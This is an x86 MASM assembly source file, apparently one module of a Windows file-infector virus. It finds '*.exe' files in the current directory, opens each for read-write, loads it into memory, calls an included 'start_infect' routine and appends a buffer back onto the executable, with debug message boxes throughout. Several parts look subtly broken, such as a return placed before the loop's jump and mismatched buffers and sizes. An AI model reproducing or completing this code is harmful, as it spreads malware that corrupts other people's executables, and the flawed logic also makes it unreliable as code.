ifndef SEARCH_FILES_ASM_
SEARCH_FILES_ASM_ MACRO
ENDM

include infect_file.asm

.data

errorMsgCaption db "Error!", 0
errorMsgText db "Error finding first file!", 0
errorMsgText2 db "Error opening file!", 0
errorMsgText3 db "Error seeking file!", 0
errorMsgText4 db "Error telling file size!", 0
errorMsgText5 db "Error reading the file!", 0
errorMsgText6 db "Error writing into the file!", 0
writeText db "Texto añadido por el programa.", 0
mode db "r+b", 0
file_regex_sf db "*.exe", 0
buffer_db db 256 dup(0)
format_db db "File size: %d", 0
msgCaption_db db "File Info", 0
filebuffer db 460 dup(0)
win32finddata_sf  WIN32_FIND_DATA <> ;destroy
msgText_sf db "from search_files:Iam jambi", 0
endMsgText db "End of search!", 0
.data?

filesearchhandle_sf dd ?
filehandle_sf dd ?
filesize_sf dd ?
fileptr_sf dd ?
bytesRead dd ?


.code


start_search PROC addr_win32finddata:PTR WIN32_FIND_DATA, addr_file_regex:PTR,addr_win32finddata_cFileName:PTR
   
 
    ; Accede al primer parámetro

 ;   invoke FindFirstFileA,addr_file_regex,addr_win32finddata
    
   
     
;    cmp eax, INVALID_HANDLE_VALUE
;    je findfirstfile_failed
;    mov filesearchhandle_sf, eax

;search_exe_loop:
;    invoke MessageBoxA, NULL, addr_win32finddata_cFileName, addr msgCaption_db, MB_OK
    
    start:
    invoke FindFirstFileA, addr file_regex, addr_win32finddata
    cmp eax, INVALID_HANDLE_VALUE
    je findfirstfile_failed
    mov filesearchhandle_sf, eax

search_exe_loop:
    invoke MessageBoxA, NULL, addr_win32finddata_cFileName, addr msgCaption, MB_OK
    
    invoke crt_fopen, addr_win32finddata_cFileName, addr mode
    mov filehandle_sf, eax
    cmp filehandle_sf, 0
    je open_failed

    invoke crt_fseek, filehandle_sf, 0, 2 ; SEEK_END is 2
    cmp eax, 0
    jne fseek_failed

    invoke crt_ftell, filehandle_sf
    cmp eax, -1
    je ftell_failed

    mov filesize_sf, eax
    invoke wsprintf, addr buffer_db, addr format_db, filesize_sf
    invoke MessageBoxA, NULL, addr buffer_db, addr msgCaption, MB_OK

    
    add eax, 5000h
    invoke VirtualAlloc, 0, eax, MEM_COMMIT, PAGE_READWRITE
   
    cmp eax, 0
    je syserr
     mov fileptr_sf, eax
    
     invoke crt_fseek, filehandle_sf, 0, 0 ; SEEK_SET is 0
    cmp eax, 0
    jne fseek_failed

   mov filesize_sf,sizeof filebuffer
    ; Leer el archivo usando crt_fgets

    invoke crt_fread, fileptr_sf, 1, filesize_sf, filehandle_sf
    mov bytesRead, eax
    
    cmp eax, 0
    je syserr
    
   invoke MessageBoxA, NULL, addr filebuffer, addr msgCaption_db, MB_OK
   
   ; Insertar código en el archivo
    mov  esi, fileptr_sf   

   ; mov  filesize_sf, eax
   ;invoke infect_file, fileptr, filesize 
   invoke start_infect
    
     invoke MessageBoxA, NULL, addr filebuffer, addr msgCaption_db, MB_OK
    invoke crt_fseek, filehandle_sf, 0, 2 ; SEEK_END is 2
    cmp eax, 0
    jne fseek_failed
    
    

    invoke crt_fwrite,addr filebuffer ,filesize_sf,1,filehandle_sf
         ; WriteFile(). Write the buffer back to the file.
    
    
   ;; Escribir texto en el archivo
   ; invoke crt_fwrite, addr msgText_sf, sizeof msgText_sf - 1, 1, filehandle_sf
    cmp eax, 1
    jne error_writing_file

    invoke crt_fseek, filehandle_sf, 0, 2 ; SEEK_END is 2
    cmp eax, 0
    jne fseek_failed

    invoke crt_ftell, filehandle_sf
    cmp eax, -1
    je ftell_failed

    mov filesize_sf, eax
    invoke wsprintf, addr buffer_db, addr format_db, filesize_sf
    invoke MessageBoxA, NULL, addr buffer_db, addr msgCaption, MB_OK
    ; Cierra el archivo
    invoke crt_fclose, filehandle_sf

    invoke VirtualFree, fileptr_sf, 0, MEM_RELEASE
    
    
   invoke MessageBox, NULL, addr endMsgText, addr msgCaption_db, MB_OK
    
    ret  
    ; Buscar el siguiente archivo
    jmp find_next


open_failed:
    invoke MessageBox, NULL, addr errorMsgText2, addr errorMsgCaption, MB_OK
    jmp find_next

fseek_failed:
    invoke MessageBox, 0, addr errorMsgText3, addr msgCaption_db, MB_OK
    invoke ExitProcess, 2

ftell_failed:
    invoke MessageBox, 0, addr errorMsgText4, addr msgCaption_db, MB_OK
    invoke ExitProcess, 3

syserr:
    invoke MessageBox, NULL, addr errorMsgText5, addr errorMsgCaption, MB_OK
    jmp search_exe_loop

error_writing_file:
    invoke MessageBox, 0, addr errorMsgText6, addr msgCaption_db, MB_OK
    invoke crt_fclose, filehandle_sf
    invoke ExitProcess, 1

find_next:
    invoke FindNextFileA, filesearchhandle_sf, addr win32finddata_sf
    cmp eax, 0
    je exit_search_exe
    jmp search_exe_loop

findfirstfile_failed:
    invoke MessageBoxA, NULL, addr errorMsgText, addr errorMsgCaption, MB_OK
    jmp search_exe_loop

exit_search_exe:
    invoke FindClose, filesearchhandle_sf
    invoke ExitProcess, 0
start_search endp
endif                           ; SEARCH_FILES_ASM_